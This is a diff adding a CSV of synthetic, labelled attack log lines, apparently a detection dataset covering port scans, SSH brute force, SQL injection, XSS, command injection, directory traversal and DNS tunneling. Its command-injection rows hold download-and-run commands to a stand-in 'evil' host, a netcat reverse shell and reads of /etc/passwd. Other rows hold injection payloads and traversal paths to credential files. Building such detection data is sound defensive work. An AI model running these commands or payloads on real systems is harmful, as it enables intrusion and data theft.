@@ -1,0 +1,201 @@
+id,attack_type,protocol,log_example,expected_label
+SNORT-P1-0001,port_scan,mixed,"2026-05-25T08:10:12Z FW scan_event src=198.51.100.10 dst=10.0.0.20 proto=TCP spt=40000 dpt=22 flags=SYN note=connection attempts to ports 21,22,80,443 within 7s",malicious
+SNORT-P1-0002,port_scan,tcp,"1716800001.12 C001 198.51.100.11 40011 10.0.1.21 80 tcp S0 scan_ports=ports 22,25,110,143 msg=sequential SYN scan",malicious
+SNORT-P1-0003,port_scan,tcp,"2026-05-25T08:12:12Z FW scan_event src=198.51.100.12 dst=10.0.2.22 proto=TCP spt=40022 dpt=22 flags=SYN note=connection attempts to ports 53,80,443,8443 within 7s",malicious
+SNORT-P1-0004,port_scan,mixed,"1716800003.12 C003 198.51.100.13 40033 10.0.3.23 80 tcp S0 scan_ports=ports 135,139,445,3389 msg=sequential SYN scan",malicious
+SNORT-P1-0005,port_scan,tcp,"2026-05-25T08:14:12Z FW scan_event src=198.51.100.14 dst=10.0.0.24 proto=TCP spt=40044 dpt=22 flags=SYN note=connection attempts to ports 161,162,514,2049 within 7s",malicious
+SNORT-P1-0006,port_scan,tcp,"1716800005.12 C005 198.51.100.15 40055 10.0.1.25 80 tcp S0 scan_ports=ports 8080,8443,9000,9443 msg=sequential SYN scan",malicious
+SNORT-P1-0007,port_scan,mixed,"2026-05-25T08:16:12Z FW scan_event src=198.51.100.16 dst=10.0.2.26 proto=TCP spt=40066 dpt=22 flags=SYN note=connection attempts to ports 3306,5432,6379,9200 within 7s",malicious
+SNORT-P1-0008,port_scan,tcp,"1716800007.12 C007 198.51.100.17 40077 10.0.3.27 80 tcp S0 scan_ports=ports 5900,5901,6000,8081 msg=sequential SYN scan",malicious
+SNORT-P1-0009,port_scan,tcp,"2026-05-25T08:18:12Z FW scan_event src=198.51.100.18 dst=10.0.0.28 proto=TCP spt=40088 dpt=22 flags=SYN note=connection attempts to ports 23,69,111,515 within 7s",malicious
+SNORT-P1-0010,port_scan,mixed,"1716800009.12 C009 198.51.100.19 40099 10.0.1.29 80 tcp S0 scan_ports=ports 88,389,636,3268 msg=sequential SYN scan",malicious
+SNORT-P1-0011,port_scan,tcp,"2026-05-25T08:20:12Z FW scan_event src=198.51.100.20 dst=10.0.2.30 proto=TCP spt=40110 dpt=22 flags=SYN note=connection attempts to ports 67,68,123,161 within 7s",malicious
+SNORT-P1-0012,port_scan,tcp,"1716800011.12 C011 198.51.100.21 40121 10.0.3.31 80 tcp S0 scan_ports=ports 5000,5060,5061,8088 msg=sequential SYN scan",malicious
+SNORT-P1-0013,port_scan,mixed,"2026-05-25T08:22:12Z FW scan_event src=198.51.100.22 dst=10.0.0.32 proto=TCP spt=40132 dpt=22 flags=SYN note=connection attempts to ports 137,138,139,445 within 7s",malicious
+SNORT-P1-0014,port_scan,tcp,"1716800013.12 C013 198.51.100.23 40143 10.0.1.33 80 tcp S0 scan_ports=ports 1521,2483,3306,5432 msg=sequential SYN scan",malicious
+SNORT-P1-0015,port_scan,tcp,"2026-05-25T08:24:12Z FW scan_event src=198.51.100.24 dst=10.0.2.34 proto=TCP spt=40154 dpt=22 flags=SYN note=connection attempts to ports 53,123,1900,5353 within 7s",malicious
+SNORT-P1-0016,port_scan,mixed,"1716800015.12 C015 198.51.100.25 40165 10.0.3.35 80 tcp S0 scan_ports=ports 8000,8080,8888,9001 msg=sequential SYN scan",malicious
+SNORT-P1-0017,port_scan,tcp,"2026-05-25T08:26:12Z FW scan_event src=198.51.100.26 dst=10.0.0.36 proto=TCP spt=40176 dpt=22 flags=SYN note=connection attempts to ports 22,80,443,3128 within 7s",malicious
+SNORT-P1-0018,port_scan,tcp,"1716800017.12 C017 198.51.100.27 40187 10.0.1.37 80 tcp S0 scan_ports=ports 25,465,587,993 msg=sequential SYN scan",malicious
+SNORT-P1-0019,port_scan,mixed,"2026-05-25T08:28:12Z FW scan_event src=198.51.100.28 dst=10.0.2.38 proto=TCP spt=40198 dpt=22 flags=SYN note=connection attempts to ports 53,853,5355,5357 within 7s",malicious
+SNORT-P1-0020,port_scan,tcp,"1716800019.12 C019 198.51.100.29 40209 10.0.3.39 80 tcp S0 scan_ports=ports 443,8443,9443,10443 msg=sequential SYN scan",malicious
+SNORT-P1-0021,ssh_bruteforce,tcp,May 25 09:00:14 bastion sshd[2100]: Failed password for admin from 203.0.113.20 port 45000 ssh2 repeated=9,malicious
+SNORT-P1-0022,ssh_bruteforce,tcp,2026-05-25T09:01:14Z IDS ssh_auth_failure src=203.0.113.21 dst=10.10.0.31 proto=TCP dpt=22 user=root attempts=8 event=authentication failure,malicious
+SNORT-P1-0023,ssh_bruteforce,tcp,May 25 09:02:14 bastion sshd[2102]: Failed password for backup from 203.0.113.22 port 45002 ssh2 repeated=9,malicious
+SNORT-P1-0024,ssh_bruteforce,tcp,2026-05-25T09:03:14Z IDS ssh_auth_failure src=203.0.113.23 dst=10.10.0.33 proto=TCP dpt=22 user=deploy attempts=10 event=authentication failure,malicious
+SNORT-P1-0025,ssh_bruteforce,tcp,May 25 09:04:14 bastion sshd[2104]: Failed password for oracle from 203.0.113.24 port 45004 ssh2 repeated=9,malicious
+SNORT-P1-0026,ssh_bruteforce,tcp,2026-05-25T09:05:14Z IDS ssh_auth_failure src=203.0.113.25 dst=10.10.0.35 proto=TCP dpt=22 user=ubuntu attempts=8 event=authentication failure,malicious
+SNORT-P1-0027,ssh_bruteforce,tcp,May 25 09:06:14 bastion sshd[2106]: Failed password for git from 203.0.113.26 port 45006 ssh2 repeated=9,malicious
+SNORT-P1-0028,ssh_bruteforce,tcp,2026-05-25T09:07:14Z IDS ssh_auth_failure src=203.0.113.27 dst=10.10.0.37 proto=TCP dpt=22 user=jenkins attempts=10 event=authentication failure,malicious
+SNORT-P1-0029,ssh_bruteforce,tcp,May 25 09:08:14 bastion sshd[2108]: Failed password for test from 203.0.113.28 port 45008 ssh2 repeated=9,malicious
+SNORT-P1-0030,ssh_bruteforce,tcp,2026-05-25T09:09:14Z IDS ssh_auth_failure src=203.0.113.29 dst=10.10.0.39 proto=TCP dpt=22 user=support attempts=8 event=authentication failure,malicious
+SNORT-P1-0031,ssh_bruteforce,tcp,May 25 09:10:14 bastion sshd[2110]: Failed password for devops from 203.0.113.30 port 45010 ssh2 repeated=9,malicious
+SNORT-P1-0032,ssh_bruteforce,tcp,2026-05-25T09:11:14Z IDS ssh_auth_failure src=203.0.113.31 dst=10.10.0.41 proto=TCP dpt=22 user=nagios attempts=10 event=authentication failure,malicious
+SNORT-P1-0033,ssh_bruteforce,tcp,May 25 09:12:14 bastion sshd[2112]: Failed password for ansible from 203.0.113.32 port 45012 ssh2 repeated=9,malicious
+SNORT-P1-0034,ssh_bruteforce,tcp,2026-05-25T09:13:14Z IDS ssh_auth_failure src=203.0.113.33 dst=10.10.0.43 proto=TCP dpt=22 user=svc-ci attempts=8 event=authentication failure,malicious
+SNORT-P1-0035,ssh_bruteforce,tcp,May 25 09:14:14 bastion sshd[2114]: Failed password for postgres from 203.0.113.34 port 45014 ssh2 repeated=9,malicious
+SNORT-P1-0036,ssh_bruteforce,tcp,2026-05-25T09:15:14Z IDS ssh_auth_failure src=203.0.113.35 dst=10.10.0.45 proto=TCP dpt=22 user=webadmin attempts=10 event=authentication failure,malicious
+SNORT-P1-0037,ssh_bruteforce,tcp,May 25 09:16:14 bastion sshd[2116]: Failed password for operator from 203.0.113.36 port 45016 ssh2 repeated=9,malicious
+SNORT-P1-0038,ssh_bruteforce,tcp,2026-05-25T09:17:14Z IDS ssh_auth_failure src=203.0.113.37 dst=10.10.0.47 proto=TCP dpt=22 user=finance attempts=8 event=authentication failure,malicious
+SNORT-P1-0039,ssh_bruteforce,tcp,May 25 09:18:14 bastion sshd[2118]: Failed password for audit from 203.0.113.38 port 45018 ssh2 repeated=9,malicious
+SNORT-P1-0040,ssh_bruteforce,tcp,2026-05-25T09:19:14Z IDS ssh_auth_failure src=203.0.113.39 dst=10.10.0.49 proto=TCP dpt=22 user=training attempts=10 event=authentication failure,malicious
+SNORT-P1-0041,sql_injection,http,"192.0.2.40 - - [25/May/2026:10:00:02 +0000] ""GET /products?id=7%20UNION%20SELECT%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0042,sql_injection,https,"2026/05/25 10:01:02 [warn] waf: client=192.0.2.41 host=shop.local uri=""/search?q=' OR 1=1 --"" msg=""SQL keyword detected"" status=403 proto=HTTPS",malicious
+SNORT-P1-0043,sql_injection,tcp,"192.0.2.42 - - [25/May/2026:10:02:02 +0000] ""GET /products?id=7%20SLEEP(5)%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0044,sql_injection,http,"2026/05/25 10:03:02 [warn] waf: client=192.0.2.43 host=shop.local uri=""/search?q=SELECT@@version"" msg=""SQL keyword detected"" status=403 proto=HTTP",malicious
+SNORT-P1-0045,sql_injection,https,"192.0.2.44 - - [25/May/2026:10:04:02 +0000] ""GET /products?id=7%20WAITFOR%20DELAY%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0046,sql_injection,tcp,"2026/05/25 10:05:02 [warn] waf: client=192.0.2.45 host=shop.local uri=""/search?q=information_schema"" msg=""SQL keyword detected"" status=403 proto=TCP",malicious
+SNORT-P1-0047,sql_injection,http,"192.0.2.46 - - [25/May/2026:10:06:02 +0000] ""GET /products?id=7%20UNION%20ALL%20SELECT%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0048,sql_injection,https,"2026/05/25 10:07:02 [warn] waf: client=192.0.2.47 host=shop.local uri=""/search?q=load_file("" msg=""SQL keyword detected"" status=403 proto=HTTPS",malicious
+SNORT-P1-0049,sql_injection,tcp,"192.0.2.48 - - [25/May/2026:10:08:02 +0000] ""GET /products?id=7%20benchmark(%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0050,sql_injection,http,"2026/05/25 10:09:02 [warn] waf: client=192.0.2.49 host=shop.local uri=""/search?q=xp_cmdshell"" msg=""SQL keyword detected"" status=403 proto=HTTP",malicious
+SNORT-P1-0051,sql_injection,https,"192.0.2.50 - - [25/May/2026:10:10:02 +0000] ""GET /products?id=7%20concat(0x7e%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0052,sql_injection,tcp,"2026/05/25 10:11:02 [warn] waf: client=192.0.2.51 host=shop.local uri=""/search?q=pg_sleep(3)"" msg=""SQL keyword detected"" status=403 proto=TCP",malicious
+SNORT-P1-0053,sql_injection,http,"192.0.2.52 - - [25/May/2026:10:12:02 +0000] ""GET /products?id=7%20updatexml(%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0054,sql_injection,https,"2026/05/25 10:13:02 [warn] waf: client=192.0.2.53 host=shop.local uri=""/search?q=extractvalue("" msg=""SQL keyword detected"" status=403 proto=HTTPS",malicious
+SNORT-P1-0055,sql_injection,tcp,"192.0.2.54 - - [25/May/2026:10:14:02 +0000] ""GET /products?id=7%20or%201=1#%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0056,sql_injection,http,"2026/05/25 10:15:02 [warn] waf: client=192.0.2.55 host=shop.local uri=""/search?q=union select null"" msg=""SQL keyword detected"" status=403 proto=HTTP",malicious
+SNORT-P1-0057,sql_injection,https,"192.0.2.56 - - [25/May/2026:10:16:02 +0000] ""GET /products?id=7%20sleep(8)%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0058,sql_injection,tcp,"2026/05/25 10:17:02 [warn] waf: client=192.0.2.57 host=shop.local uri=""/search?q=having 1=1"" msg=""SQL keyword detected"" status=403 proto=TCP",malicious
+SNORT-P1-0059,sql_injection,http,"192.0.2.58 - - [25/May/2026:10:18:02 +0000] ""GET /products?id=7%20order%20by%20999%20users HTTP/1.1"" 500 812 ""-"" ""sqlmap/1.7""",malicious
+SNORT-P1-0060,sql_injection,https,"2026/05/25 10:19:02 [warn] waf: client=192.0.2.59 host=shop.local uri=""/search?q=cast((select"" msg=""SQL keyword detected"" status=403 proto=HTTPS",malicious
+SNORT-P1-0061,xss,http,"203.0.113.60 - - [25/May/2026:11:00:22 +0000] ""GET /comment?text=<script>alert(1)</script> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0062,xss,https,"2026-05-25T11:01:22Z proxy event src=203.0.113.61 dst=10.20.0.11 proto=HTTPS uri=""/feedback?msg=<img src=x onerror=alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0063,xss,tcp,"203.0.113.62 - - [25/May/2026:11:02:22 +0000] ""GET /comment?text=<svg/onload=alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0064,xss,http,"2026-05-25T11:03:22Z proxy event src=203.0.113.63 dst=10.20.0.13 proto=HTTP uri=""/feedback?msg=javascript:alert(1)"" note=""reflected xss marker""",malicious
+SNORT-P1-0065,xss,https,"203.0.113.64 - - [25/May/2026:11:04:22 +0000] ""GET /comment?text=<body%20onload=alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0066,xss,tcp,"2026-05-25T11:05:22Z proxy event src=203.0.113.65 dst=10.20.0.15 proto=TCP uri=""/feedback?msg=<iframe src=javascript:alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0067,xss,http,"203.0.113.66 - - [25/May/2026:11:06:22 +0000] ""GET /comment?text=<details%20open%20ontoggle=alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0068,xss,https,"2026-05-25T11:07:22Z proxy event src=203.0.113.67 dst=10.20.0.17 proto=HTTPS uri=""/feedback?msg=<a href=javascript:alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0069,xss,tcp,"203.0.113.68 - - [25/May/2026:11:08:22 +0000] ""GET /comment?text=<math%20href=javascript:alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0070,xss,http,"2026-05-25T11:09:22Z proxy event src=203.0.113.69 dst=10.20.0.19 proto=HTTP uri=""/feedback?msg=<video><source onerror=alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0071,xss,https,"203.0.113.70 - - [25/May/2026:11:10:22 +0000] ""GET /comment?text=<script>fetch(""/x"")</script> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0072,xss,tcp,"2026-05-25T11:11:22Z proxy event src=203.0.113.71 dst=10.20.0.21 proto=TCP uri=""/feedback?msg=<img src=1 onerror=confirm(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0073,xss,http,"203.0.113.72 - - [25/May/2026:11:12:22 +0000] ""GET /comment?text=<svg><script>alert(7)</script> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0074,xss,https,"2026-05-25T11:13:22Z proxy event src=203.0.113.73 dst=10.20.0.23 proto=HTTPS uri=""/feedback?msg=<div onmouseover=alert(3)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0075,xss,tcp,"203.0.113.74 - - [25/May/2026:11:14:22 +0000] ""GET /comment?text=<object%20data=javascript:alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0076,xss,http,"2026-05-25T11:15:22Z proxy event src=203.0.113.75 dst=10.20.0.25 proto=HTTP uri=""/feedback?msg=<embed src=javascript:alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0077,xss,https,"203.0.113.76 - - [25/May/2026:11:16:22 +0000] ""GET /comment?text=<form><button%20formaction=javascript:alert(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0078,xss,tcp,"2026-05-25T11:17:22Z proxy event src=203.0.113.77 dst=10.20.0.27 proto=TCP uri=""/feedback?msg=<marquee onstart=alert(1)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0079,xss,http,"203.0.113.78 - - [25/May/2026:11:18:22 +0000] ""GET /comment?text=<img%20src=x%20onerror=prompt(1)> HTTP/1.1"" 200 421 ""https://forum.local/thread/7"" ""Mozilla/5.0""",malicious
+SNORT-P1-0080,xss,https,"2026-05-25T11:19:22Z proxy event src=203.0.113.79 dst=10.20.0.29 proto=HTTPS uri=""/feedback?msg=<svg onload=confirm(9)>"" note=""reflected xss marker""",malicious
+SNORT-P1-0081,command_injection,http,"2026-05-25T12:00:55Z waf alert src=198.51.100.80 dst=10.30.0.10 uri=""/cgi-bin/admin?cmd=;wget http://evil/p.sh"" action=blocked signature=command_injection proto=HTTP",malicious
+SNORT-P1-0082,command_injection,https,"198.51.100.81 - - [25/May/2026:12:01:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test&& curl http://evil/i.sh""",malicious
+SNORT-P1-0083,command_injection,tcp,"2026-05-25T12:02:55Z waf alert src=198.51.100.82 dst=10.30.0.12 uri=""/cgi-bin/admin?cmd=|/bin/sh"" action=blocked signature=command_injection proto=TCP",malicious
+SNORT-P1-0084,command_injection,http,"198.51.100.83 - - [25/May/2026:12:03:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; nc 198.51.100.5 4444 -e /bin/sh""",malicious
+SNORT-P1-0085,command_injection,https,"2026-05-25T12:04:55Z waf alert src=198.51.100.84 dst=10.30.0.14 uri=""/cgi-bin/admin?cmd=cmd=/bin/sh -c id"" action=blocked signature=command_injection proto=HTTPS",malicious
+SNORT-P1-0086,command_injection,tcp,"198.51.100.85 - - [25/May/2026:12:05:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; powershell -enc AAAA""",malicious
+SNORT-P1-0087,command_injection,http,"2026-05-25T12:06:55Z waf alert src=198.51.100.86 dst=10.30.0.16 uri=""/cgi-bin/admin?cmd=&& bash -c whoami"" action=blocked signature=command_injection proto=HTTP",malicious
+SNORT-P1-0088,command_injection,https,"198.51.100.87 - - [25/May/2026:12:07:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; python3 -c print(7)""",malicious
+SNORT-P1-0089,command_injection,tcp,"2026-05-25T12:08:55Z waf alert src=198.51.100.88 dst=10.30.0.18 uri=""/cgi-bin/admin?cmd=|curl -fsSL http://bad/x"" action=blocked signature=command_injection proto=TCP",malicious
+SNORT-P1-0090,command_injection,http,"198.51.100.89 - - [25/May/2026:12:09:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; uname -a""",malicious
+SNORT-P1-0091,command_injection,https,"2026-05-25T12:10:55Z waf alert src=198.51.100.90 dst=10.30.0.20 uri=""/cgi-bin/admin?cmd=&& id"" action=blocked signature=command_injection proto=HTTPS",malicious
+SNORT-P1-0092,command_injection,tcp,"198.51.100.91 - - [25/May/2026:12:11:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; cat /etc/passwd""",malicious
+SNORT-P1-0093,command_injection,http,"2026-05-25T12:12:55Z waf alert src=198.51.100.92 dst=10.30.0.22 uri=""/cgi-bin/admin?cmd=|sh -c env"" action=blocked signature=command_injection proto=HTTP",malicious
+SNORT-P1-0094,command_injection,https,"198.51.100.93 - - [25/May/2026:12:13:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; ping -c 1 198.51.100.8""",malicious
+SNORT-P1-0095,command_injection,tcp,"2026-05-25T12:14:55Z waf alert src=198.51.100.94 dst=10.30.0.24 uri=""/cgi-bin/admin?cmd=cmd=dir"" action=blocked signature=command_injection proto=TCP",malicious
+SNORT-P1-0096,command_injection,http,"198.51.100.95 - - [25/May/2026:12:15:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; busybox wget http://evil/a""",malicious
+SNORT-P1-0097,command_injection,https,"2026-05-25T12:16:55Z waf alert src=198.51.100.96 dst=10.30.0.26 uri=""/cgi-bin/admin?cmd=&& perl -e print 1"" action=blocked signature=command_injection proto=HTTPS",malicious
+SNORT-P1-0098,command_injection,tcp,"198.51.100.97 - - [25/May/2026:12:17:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; php -r system(""id"")""",malicious
+SNORT-P1-0099,command_injection,http,"2026-05-25T12:18:55Z waf alert src=198.51.100.98 dst=10.30.0.28 uri=""/cgi-bin/admin?cmd=|cmd.exe /c whoami"" action=blocked signature=command_injection proto=HTTP",malicious
+SNORT-P1-0100,command_injection,https,"198.51.100.99 - - [25/May/2026:12:19:55 +0000] ""POST /tools/run HTTP/1.1"" 500 921 ""-"" ""curl/8.0"" body=""name=test; /usr/bin/curl http://evil/b""",malicious
+SNORT-P1-0101,directory_traversal,http,"203.0.113.100 - - [25/May/2026:13:00:40 +0000] ""GET ../../../../etc/passwd HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0102,directory_traversal,https,"2026-05-25T13:01:40Z nginx access src=203.0.113.101 host=portal.local uri=""..%2f..%2f..%2fetc/passwd"" status=403 note=""directory traversal pattern"" proto=HTTPS",malicious
+SNORT-P1-0103,directory_traversal,tcp,"203.0.113.102 - - [25/May/2026:13:02:40 +0000] ""GET ..\..\..\windows\win.ini HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0104,directory_traversal,http,"2026-05-25T13:03:40Z nginx access src=203.0.113.103 host=portal.local uri=""/download?file=../../secret.txt"" status=403 note=""directory traversal pattern"" proto=HTTP",malicious
+SNORT-P1-0105,directory_traversal,https,"203.0.113.104 - - [25/May/2026:13:04:40 +0000] ""GET /view?path=..%2F..%2Fapp.conf HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0106,directory_traversal,tcp,"2026-05-25T13:05:40Z nginx access src=203.0.113.105 host=portal.local uri=""/static/../../admin.env"" status=403 note=""directory traversal pattern"" proto=TCP",malicious
+SNORT-P1-0107,directory_traversal,http,"203.0.113.106 - - [25/May/2026:13:06:40 +0000] ""GET /cgi-bin/../../../../etc/shadow HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0108,directory_traversal,https,"2026-05-25T13:07:40Z nginx access src=203.0.113.107 host=portal.local uri=""/docs/..%2f..%2fboot.ini"" status=403 note=""directory traversal pattern"" proto=HTTPS",malicious
+SNORT-P1-0109,directory_traversal,tcp,"203.0.113.108 - - [25/May/2026:13:08:40 +0000] ""GET /backup/../../../var/log/auth.log HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0110,directory_traversal,http,"2026-05-25T13:09:40Z nginx access src=203.0.113.109 host=portal.local uri=""/portal?template=../../index.php"" status=403 note=""directory traversal pattern"" proto=HTTP",malicious
+SNORT-P1-0111,directory_traversal,https,"203.0.113.110 - - [25/May/2026:13:10:40 +0000] ""GET /api?file=..%252f..%252fetc%252fpasswd HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0112,directory_traversal,tcp,"2026-05-25T13:11:40Z nginx access src=203.0.113.111 host=portal.local uri=""/open?name=../../../../web.config"" status=403 note=""directory traversal pattern"" proto=TCP",malicious
+SNORT-P1-0113,directory_traversal,http,"203.0.113.112 - - [25/May/2026:13:12:40 +0000] ""GET /export?target=../../db.sqlite HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0114,directory_traversal,https,"2026-05-25T13:13:40Z nginx access src=203.0.113.113 host=portal.local uri=""/report?doc=..%2f..%2f..%2fproc%2fself%2fenviron"" status=403 note=""directory traversal pattern"" proto=HTTPS",malicious
+SNORT-P1-0115,directory_traversal,tcp,"203.0.113.114 - - [25/May/2026:13:14:40 +0000] ""GET /image?src=../../../../etc/hosts HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0116,directory_traversal,http,"2026-05-25T13:15:40Z nginx access src=203.0.113.115 host=portal.local uri=""/files/..\..\windows\repair\sam"" status=403 note=""directory traversal pattern"" proto=HTTP",malicious
+SNORT-P1-0117,directory_traversal,https,"203.0.113.116 - - [25/May/2026:13:16:40 +0000] ""GET /preview?path=../../../../../opt/app/.env HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0118,directory_traversal,tcp,"2026-05-25T13:17:40Z nginx access src=203.0.113.117 host=portal.local uri=""/legacy/../../../conf/server.xml"" status=403 note=""directory traversal pattern"" proto=TCP",malicious
+SNORT-P1-0119,directory_traversal,http,"203.0.113.118 - - [25/May/2026:13:18:40 +0000] ""GET /help?lang=../../../../etc/passwd HTTP/1.1"" 404 210 ""-"" ""Mozilla/5.0""",malicious
+SNORT-P1-0120,directory_traversal,https,"2026-05-25T13:19:40Z nginx access src=203.0.113.119 host=portal.local uri=""/download?asset=..%2f..%2fwinnt/win.ini"" status=403 note=""directory traversal pattern"" proto=HTTPS",malicious
+SNORT-P1-0121,dns_tunneling,dns,1716812000.44 DNS a9d3-sync-node-00.segment1.data.exfil.example.com qtype=TXT src=10.40.0.20 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0122,dns_tunneling,udp,"2026-05-25T14:01:18Z zeek_dns uid=DNS001 id.orig_h=10.40.1.21 id.resp_h=8.8.4.4 proto=UDP query=""vpn-telemetry-hop-01.segment2.data.exfil.example.com"" qtype_name=TXT len=79 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0123,dns_tunneling,dns,1716812002.44 DNS backup-chunk-01-02.segment3.data.exfil.example.com qtype=TXT src=10.40.2.22 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0124,dns_tunneling,udp,"2026-05-25T14:03:18Z zeek_dns uid=DNS003 id.orig_h=10.40.0.23 id.resp_h=8.8.4.4 proto=UDP query=""cache-burst-77-03.segment4.data.exfil.example.com"" qtype_name=TXT len=81 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0125,dns_tunneling,tcp,1716812004.44 DNS hr-export-block-04.segment1.data.exfil.example.com qtype=TXT src=10.40.1.24 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0126,dns_tunneling,dns,"2026-05-25T14:05:18Z zeek_dns uid=DNS005 id.orig_h=10.40.2.25 id.resp_h=8.8.4.4 proto=DNS query=""db-archive-zip-05.segment2.data.exfil.example.com"" qtype_name=TXT len=83 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0127,dns_tunneling,udp,1716812006.44 DNS edge-metrics-long-06.segment3.data.exfil.example.com qtype=TXT src=10.40.0.26 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0128,dns_tunneling,dns,"2026-05-25T14:07:18Z zeek_dns uid=DNS007 id.orig_h=10.40.1.27 id.resp_h=8.8.4.4 proto=DNS query=""cdn-shadow-query-07.segment4.data.exfil.example.com"" qtype_name=TXT len=85 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0129,dns_tunneling,udp,1716812008.44 DNS finance-ledger-part-08.segment1.data.exfil.example.com qtype=TXT src=10.40.2.28 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0130,dns_tunneling,tcp,"2026-05-25T14:09:18Z zeek_dns uid=DNS009 id.orig_h=10.40.0.29 id.resp_h=8.8.4.4 proto=TCP query=""iot-state-report-09.segment2.data.exfil.example.com"" qtype_name=TXT len=87 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0131,dns_tunneling,dns,1716812010.44 DNS mailseed-fragment-10.segment3.data.exfil.example.com qtype=TXT src=10.40.1.30 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0132,dns_tunneling,udp,"2026-05-25T14:11:18Z zeek_dns uid=DNS011 id.orig_h=10.40.2.31 id.resp_h=8.8.4.4 proto=UDP query=""prodconfig-xfer-11.segment4.data.exfil.example.com"" qtype_name=TXT len=89 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0133,dns_tunneling,dns,1716812012.44 DNS staging-build-tag-12.segment1.data.exfil.example.com qtype=TXT src=10.40.0.32 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0134,dns_tunneling,udp,"2026-05-25T14:13:18Z zeek_dns uid=DNS013 id.orig_h=10.40.1.33 id.resp_h=8.8.4.4 proto=UDP query=""dnswrap-session-13.segment2.data.exfil.example.com"" qtype_name=TXT len=91 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0135,dns_tunneling,tcp,1716812014.44 DNS inventory-slice-14.segment3.data.exfil.example.com qtype=TXT src=10.40.2.34 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0136,dns_tunneling,dns,"2026-05-25T14:15:18Z zeek_dns uid=DNS015 id.orig_h=10.40.0.35 id.resp_h=8.8.4.4 proto=DNS query=""metrics-rollup-15.segment4.data.exfil.example.com"" qtype_name=TXT len=93 warning=""dns tunneling suspicion""",malicious
